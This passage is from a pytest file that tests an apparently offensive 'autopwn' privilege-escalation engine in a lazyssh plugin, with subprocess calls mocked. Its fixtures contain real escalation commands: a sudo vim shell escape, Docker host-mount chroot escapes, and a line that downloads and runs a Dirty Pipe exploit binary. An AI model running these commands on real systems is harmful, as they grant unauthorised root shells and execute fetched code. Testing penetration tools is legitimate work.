                key="gtfobins_sudo",
                category="users",
                severity="high",
                headline="Sudo exploitable",
                detail="Found 1",
                evidence=["(root) NOPASSWD: /usr/bin/vim"],
                exploitation_difficulty="instant",
                exploit_commands=["sudo vim -c ':!/bin/sh'"],
            )
        ]

        with mock.patch("lazyssh.plugins._autopwn._confirm", return_value=False):
            engine = AutopwnEngine(snapshot, findings, dry_run=False)
            result = engine.run()
            assert len(result.attempts) == 0

    def test_sudo_live_success(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """Test sudo exploit live success (lines 365-386)."""
        monkeypatch.setenv("LAZYSSH_SOCKET_PATH", "/tmp/sock")
        monkeypatch.setenv("LAZYSSH_HOST", "testhost")
        monkeypatch.setenv("LAZYSSH_USER", "testuser")

        probes = {
            "users": {
                "sudo_check": _probe(
                    "users",
                    "sudo_check",
                    "User user may run the following commands:\n"
                    "    (root) NOPASSWD: /usr/bin/vim\n",
                ),
            },
        }
        snapshot = _snapshot(probes)
        findings = [
            enumerate_plugin.PriorityFinding(
                key="gtfobins_sudo",
                category="users",
                severity="high",
                headline="Sudo exploitable",
                detail="Found 1",
                evidence=["(root) NOPASSWD: /usr/bin/vim"],
                exploitation_difficulty="instant",
                exploit_commands=["sudo vim -c ':!/bin/sh'"],
            )
        ]

        mock_result = mock.MagicMock()
        mock_result.returncode = 0
        mock_result.stdout = "root shell"
        mock_result.stderr = ""

        with (
            mock.patch("lazyssh.plugins._autopwn._confirm", return_value=True),
            mock.patch("subprocess.run", return_value=mock_result),
        ):
            engine = AutopwnEngine(snapshot, findings, dry_run=False)
            result = engine.run()
            assert len(result.attempts) == 1
            assert result.attempts[0].success is True
            assert result.attempts[0].technique == "gtfobins_sudo"


class TestAutopwnDockerEdgeCases:
    """Tests for docker escape edge cases."""

    def test_docker_custom_command(self) -> None:
        """Test docker escape with custom command from exploit_commands (line 395)."""
        snapshot = _snapshot({})
        findings = [
            enumerate_plugin.PriorityFinding(
                key="docker_escape",
                category="container",
                severity="high",
                headline="Docker escape",
                detail="Docker accessible",
                evidence=["Docker socket accessible"],
                exploitation_difficulty="easy",
                exploit_commands=["docker run -v /:/mnt --rm -it alpine chroot /mnt sh"],
            )
        ]
        engine = AutopwnEngine(snapshot, findings, dry_run=True)
        result = engine.run()
        assert len(result.attempts) == 1
        assert "alpine chroot /mnt sh" in result.attempts[0].command

    def test_docker_live_failed(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """Test docker escape live failure (line 426)."""
        monkeypatch.setenv("LAZYSSH_SOCKET_PATH", "/tmp/sock")
        monkeypatch.setenv("LAZYSSH_HOST", "testhost")
        monkeypatch.setenv("LAZYSSH_USER", "testuser")

        snapshot = _snapshot({})
        findings = [
            enumerate_plugin.PriorityFinding(
                key="docker_escape",
                category="container",
                severity="high",
                headline="Docker escape",
                detail="Docker accessible",
                evidence=["Docker socket accessible"],
                exploitation_difficulty="easy",
                exploit_commands=["docker run -v /:/hostfs -it alpine chroot /hostfs /bin/bash"],
            )
        ]

        mock_result = mock.MagicMock()
        mock_result.returncode = 1
        mock_result.stdout = ""
        mock_result.stderr = "docker: permission denied"

        with (
            mock.patch("lazyssh.plugins._autopwn._confirm", return_value=True),
            mock.patch("subprocess.run", return_value=mock_result),
        ):
            engine = AutopwnEngine(snapshot, findings, dry_run=False)
            result = engine.run()
            assert len(result.attempts) == 1
            assert result.attempts[0].success is False


class TestAutopwnCronEdgeCases:
    """Tests for writable cron edge cases."""

    def test_cron_user_decline(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """Test user declines cron injection (lines 478-479)."""
        monkeypatch.setenv("LAZYSSH_SOCKET_PATH", "/tmp/sock")
        monkeypatch.setenv("LAZYSSH_HOST", "testhost")
        monkeypatch.setenv("LAZYSSH_USER", "testuser")

        probes = {
            "writable": {
                "writable_cron": _probe(
                    "writable", "writable_cron", "WRITABLE:/etc/crontab\nDONE\n"
                ),
            },
        }
        snapshot = _snapshot(probes)
        findings = [
            enumerate_plugin.PriorityFinding(
                key="writable_cron_files",
                category="writable",
                severity="medium",
                headline="Writable cron",
                detail="Found 1",
                evidence=["/etc/crontab"],
                exploitation_difficulty="moderate",
                exploit_commands=["# cron payload"],
            )
        ]

        with mock.patch("lazyssh.plugins._autopwn._confirm", return_value=False):
            engine = AutopwnEngine(snapshot, findings, dry_run=False)
            result = engine.run()
            assert len(result.attempts) == 0

    def test_cron_live_failed(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """Test cron injection failure (line 492)."""
        monkeypatch.setenv("LAZYSSH_SOCKET_PATH", "/tmp/sock")
        monkeypatch.setenv("LAZYSSH_HOST", "testhost")
        monkeypatch.setenv("LAZYSSH_USER", "testuser")

        probes = {
            "writable": {
                "writable_cron": _probe(
                    "writable", "writable_cron", "WRITABLE:/etc/crontab\nDONE\n"
                ),
            },
        }
        snapshot = _snapshot(probes)
        findings = [
            enumerate_plugin.PriorityFinding(
                key="writable_cron_files",
                category="writable",
                severity="medium",
                headline="Writable cron",
                detail="Found 1",
                evidence=["/etc/crontab"],
                exploitation_difficulty="moderate",
                exploit_commands=["# cron payload"],
            )
        ]

        mock_result = mock.MagicMock()
        mock_result.returncode = 1
        mock_result.stdout = ""
        mock_result.stderr = "permission denied"

        with (
            mock.patch("lazyssh.plugins._autopwn._confirm", return_value=True),
            mock.patch("subprocess.run", return_value=mock_result),
        ):
            engine = AutopwnEngine(snapshot, findings, dry_run=False)
            result = engine.run()
            assert len(result.attempts) == 1
            assert result.attempts[0].success is False

    def test_cron_no_probe_data(self) -> None:
        """Test cron exploit with missing probe data (line 443)."""
        snapshot = _snapshot({})
        findings = [
            enumerate_plugin.PriorityFinding(
                key="writable_cron_files",
                category="writable",
                severity="medium",
                headline="Writable cron",
                detail="Found 0",
                evidence=[],
                exploitation_difficulty="moderate",
                exploit_commands=["# cron payload"],
            )
        ]
        engine = AutopwnEngine(snapshot, findings, dry_run=True)
        result = engine.run()
        assert len(result.attempts) == 0


class TestAutopwnServiceEdgeCases:
    """Tests for writable service edge cases."""

    def test_service_user_decline(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """Test user declines service modification (lines 556-557)."""
        monkeypatch.setenv("LAZYSSH_SOCKET_PATH", "/tmp/sock")
        monkeypatch.setenv("LAZYSSH_HOST", "testhost")
        monkeypatch.setenv("LAZYSSH_USER", "testuser")

        probes = {
            "writable": {
                "writable_services": _probe(
                    "writable",
                    "writable_services",
                    "/etc/systemd/system/custom.service\n",
                ),
            },
        }
        snapshot = _snapshot(probes)
        findings = [
            enumerate_plugin.PriorityFinding(
                key="writable_service_files",
                category="writable",
                severity="high",
                headline="Writable service files",
                detail="Found 1",
                evidence=["/etc/systemd/system/custom.service"],
                exploitation_difficulty="moderate",
                exploit_commands=["# Modify service ExecStart"],
            )
        ]

        with mock.patch("lazyssh.plugins._autopwn._confirm", return_value=False):
            engine = AutopwnEngine(snapshot, findings, dry_run=False)
            result = engine.run()
            assert len(result.attempts) == 0

    def test_service_live_failed(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """Test service modification failure (line 568)."""
        monkeypatch.setenv("LAZYSSH_SOCKET_PATH", "/tmp/sock")
        monkeypatch.setenv("LAZYSSH_HOST", "testhost")
        monkeypatch.setenv("LAZYSSH_USER", "testuser")

        probes = {
            "writable": {
                "writable_services": _probe(
                    "writable",
                    "writable_services",
                    "/etc/systemd/system/custom.service\n",
                ),
            },
        }
        snapshot = _snapshot(probes)
        findings = [
            enumerate_plugin.PriorityFinding(
                key="writable_service_files",
                category="writable",
                severity="high",
                headline="Writable service files",
                detail="Found 1",
                evidence=["/etc/systemd/system/custom.service"],
                exploitation_difficulty="moderate",
                exploit_commands=["# Modify service ExecStart"],
            )
        ]

        mock_result = mock.MagicMock()
        mock_result.returncode = 1
        mock_result.stdout = ""
        mock_result.stderr = "systemctl failed"

        with (
            mock.patch("lazyssh.plugins._autopwn._confirm", return_value=True),
            mock.patch("subprocess.run", return_value=mock_result),
        ):
            engine = AutopwnEngine(snapshot, findings, dry_run=False)
            result = engine.run()
            assert len(result.attempts) == 1
            assert result.attempts[0].success is False

    def test_service_no_probe_data(self) -> None:
        """Test service exploit with missing probe data (line 517)."""
        snapshot = _snapshot({})
        findings = [
            enumerate_plugin.PriorityFinding(
                key="writable_service_files",
                category="writable",
                severity="high",
                headline="Writable service files",
                detail="Found 0",
                evidence=[],
                exploitation_difficulty="moderate",
                exploit_commands=["# Modify service ExecStart"],
            )
        ]
        engine = AutopwnEngine(snapshot, findings, dry_run=True)
        result = engine.run()
        assert len(result.attempts) == 0


class TestAutopwnGenericDisplayEdgeCases:
    """Tests for generic exploit display edge cases."""

    def test_generic_display_with_non_comment_commands(self) -> None:
        """Test generic display shows both comments and commands (line 596)."""
        snapshot = _snapshot({})
        findings = [
            enumerate_plugin.PriorityFinding(
                key="kernel_exploits",
                category="system",
                severity="high",
                headline="Kernel exploits available",
                detail="Kernel matches CVEs",
                evidence=["CVE-2022-0847"],
                exploitation_difficulty="moderate",
                exploit_commands=[
                    "# CVE-2022-0847 (Dirty Pipe)",
                    "wget https://example.com/dirtypipe && chmod +x dirtypipe && ./dirtypipe",
                ],
            )
        ]
        engine = AutopwnEngine(snapshot, findings, dry_run=True)
        result = engine.run()
        # Generic display doesn't create attempts
        assert len(result.attempts) == 0
